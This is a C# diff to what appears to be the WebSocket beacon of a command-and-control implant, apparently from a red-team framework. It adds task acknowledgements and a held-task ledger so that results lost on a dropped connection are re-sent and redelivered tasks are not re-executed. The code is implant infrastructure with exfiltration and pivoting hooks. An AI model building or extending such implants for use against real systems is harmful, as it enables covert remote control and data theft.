@@ -39,7 +39,8 @@ internal static class WsCheckIn
         setup.Log,
         setup.Nonces,
         setup.Config.Transport,
-        setup.Cadence);
+        setup.Cadence,
+        setup.Held);
 }
 
 /// <summary>
@@ -72,6 +73,7 @@ internal sealed class WsBeacon : ICheckInClient
     private readonly Cadence? _cadence;
     private readonly FrontedPivots? _fronted;
     private readonly TaskNonceTracker _nonces;
+    private readonly HeldTaskLedger _held;
 
     // The per-artifact check-in seal, the envelope client's own: present only
     // when the bake asked for sealed check-ins, and every message this client
@@ -95,7 +97,8 @@ internal sealed class WsBeacon : ICheckInClient
         TextWriter log,
         TaskNonceTracker? nonces = null,
         TransportProfile? transport = null,
-        Cadence? cadence = null)
+        Cadence? cadence = null,
+        HeldTaskLedger? held = null)
     {
         _egress = egress;
         _implantId = implantId;
@@ -113,6 +116,7 @@ internal sealed class WsBeacon : ICheckInClient
         _classVerbs = classVerbs;
         _log = log;
         _nonces = nonces ?? new TaskNonceTracker();
+        _held = held ?? new HeldTaskLedger();
         _seal = transport is { SealsCheckIns: true }
             ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
             : null;
@@ -161,6 +165,10 @@ internal sealed class WsBeacon : ICheckInClient
             catch (Exception ex)
             {
                 _log.WriteLine($"beacon stream ended: {ex.Message}");
+                // The connection died mid-flight: results written on it may
+                // never have been read, so the next connection re-sends them
+                // (first-wins server-side).
+                _held.InvalidateDeliveries();
             }
 
             // Every non-OK handshake status is permanent for this artifact:
@@ -225,6 +233,10 @@ internal sealed class WsBeacon : ICheckInClient
             Version = new ProtocolVersion { Major = 1, Minor = 0 },
             ImplantId = _implantId,
             ReplayNonces = true,
+            // The receive-ack arm (architecture.md Sec 10.3), offered the same
+            // way: an echoing server gets an ack for every parsed task, and a
+            // stream that dies before the ack redelivers it.
+            TaskAcks = true,
         };
         handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
         await SendMessageAsync(
@@ -243,6 +255,8 @@ internal sealed class WsBeacon : ICheckInClient
             return BeaconCycleResult.Terminal;
         }
         _nonces.Negotiated = response.ReplayNonces;
+        // The receive-ack arm is per connection (architecture.md Sec 10.3).
+        var acks = response.TaskAcks;
         _log.WriteLine($"handshake ok: engagement={response.EngagementId}, replay-nonces={response.ReplayNonces}");
 
         // Tasking loop: the gRPC stream's own shape over the message
@@ -254,6 +268,18 @@ internal sealed class WsBeacon : ICheckInClient
         var writeGate = new SemaphoreSlim(1, 1);
         var liveChannels = new ConcurrentDictionary<string, BeaconLiveChannel>();
         using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+
+        // Results whose delivery died with an earlier connection ride this
+        // one first (architecture.md Sec 10.3 -- the dispatch strand); the
+        // server records first-wins, so a duplicate is absorbed.
+        foreach (var remembered in _held.Undelivered())
+        {
+            await WriteFrameAsync(
+                ws, writeGate, ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
+                cancellationToken);
+            _held.MarkDelivered(remembered.TaskId);
+        }
+
         try
         {
             var inbound = firstInbound;
@@ -273,6 +299,13 @@ internal sealed class WsBeacon : ICheckInClient
                     }
 
                     var task = TaskRequest.Parser.ParseFrom(frame.Payload);
+
+                    // The dispatch strand's ack half (architecture.md Sec
+                    // 10.3): delivery evidence for the parsed frame, before
+                    // anything runs. The dedup half lives inside
+                    // AcceptTaskingAsync, after verification.
+                    if (acks)
+                        await WriteFrameAsync(ws, writeGate, AckFrame(task.TaskId), cancellationToken);
                     await AcceptTaskingAsync(ws, writeGate, liveChannels, channelsGone.Token, task, cancellationToken);
                 }
 
@@ -320,9 +353,9 @@ internal sealed class WsBeacon : ICheckInClient
             if (_fronted is null || !_fronted.Knows(targetId))
             {
                 _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
-                await WriteFrameAsync(ws, writeGate,
-                    ResultFrame(task, TaskOutcome.Failed,
-                        $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed"),
+                await ReportResultAsync(
+                    ws, writeGate, task.TaskId, TaskOutcome.Failed,
+                    $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed",
                     cancellationToken);
                 return;
             }
@@ -350,11 +383,37 @@ internal sealed class WsBeacon : ICheckInClient
             output = cause;
             chunks = Array.Empty<ExfilChunk>();
         }
+        else if (_held.Contains(task.TaskId))
+        {
+            // The dispatch strand's dedup half (architecture.md Sec 10.3),
+            // deliberately AFTER verification: the replay defense stays ahead
+            // of the ledger, so a verbatim replay of a held task still falls
+            // at the nonce floor (or the signature) and is refused on the
+            // task. A redelivery that cleared verification re-sends the
+            // cached result unconditionally -- a redelivery implies the
+            // server holds no recorded result, and a duplicate against a
+            // completed task is a no-op there (first-wins). Nothing
+            // re-executes.
+            if (_held.TryGetResult(task.TaskId, out var heldOutcome, out var heldOutput))
+            {
+                await ReportResultAsync(ws, writeGate, task.TaskId, heldOutcome, heldOutput, cancellationToken);
+                _log.WriteLine($"task {task.TaskId} redelivered; answered from the ledger without re-running");
+            }
+            else
+            {
+                // Held but unfinished (a channel that died with its stream, a
+                // task still running): nothing to re-send and nothing to
+                // re-run.
+                _log.WriteLine($"task {task.TaskId} redelivered while still held; re-acked without re-running");
+            }
+            return;
+        }
         else if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
         {
             // The streaming shape: the task opens a channel and the handler
             // runs in the background, reporting its own final TaskResult; the
             // loop keeps reading while it runs.
+            _held.Hold(task.TaskId);
             StartChannel(ws, writeGate, liveChannels, task, channelHandler, channelLifetime);
             return;
         }
@@ -368,7 +427,12 @@ internal sealed class WsBeacon : ICheckInClient
             (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
         }
 
-        await WriteFrameAsync(ws, writeGate, ResultFrame(task, outcome, output), cancellationToken);
+        // Held from here on whatever the outcome was -- a refused task is
+        // parsed and answered too, and its redelivery is answered from the
+        // cache the same way (the channel branch held above, before its
+        // early return).
+        _held.Hold(task.TaskId);
+        await ReportResultAsync(ws, writeGate, task.TaskId, outcome, output, cancellationToken);
 
         // Out-of-band exfil chunks follow the TaskResult on the same stream.
         foreach (var chunk in chunks)
@@ -418,6 +482,8 @@ internal sealed class WsBeacon : ICheckInClient
         {
             var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
             await WriteFrameAsync(ws, writeGate, ResultFrame(task, outcome, output), CancellationToken.None);
+            _held.Remember(task.TaskId, outcome, output);
+            _held.MarkDelivered(task.TaskId);
             _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
         }
         catch (Exception ex)
@@ -536,16 +602,43 @@ internal sealed class WsBeacon : ICheckInClient
     }
 
     private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
+        => ResultFrame(task.TaskId, outcome, output);
+
+    private static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
         => new()
         {
             Payload = ByteString.CopyFrom(new TaskResult
             {
-                TaskId = task.TaskId,
+                TaskId = taskId,
                 Outcome = outcome,
                 Output = output,
             }.ToByteArray()),
             Kind = FrameKind.TaskResult,
         };
+
+    // The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
+    // one parsed task, sent before anything executes.
+    private static Frame AckFrame(string taskId)
+        => new()
+        {
+            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
+            Kind = FrameKind.TaskAck,
+        };
+
+    // Writes one task result and caches it in the held-task ledger, the same
+    // bookkeeping the gRPC stream client keeps.
+    private async Task ReportResultAsync(
+        System.Net.WebSockets.WebSocket ws,
+        SemaphoreSlim writeGate,
+        string taskId,
+        TaskOutcome outcome,
+        string output,
+        CancellationToken cancellationToken)
+    {
+        await WriteFrameAsync(ws, writeGate, ResultFrame(taskId, outcome, output), cancellationToken);
+        _held.Remember(taskId, outcome, output);
+        _held.MarkDelivered(taskId);
+    }
 
     // The socket allows one outstanding send at a time; the dispatch loop
     // and every live channel's output pumps share this connection, so all of
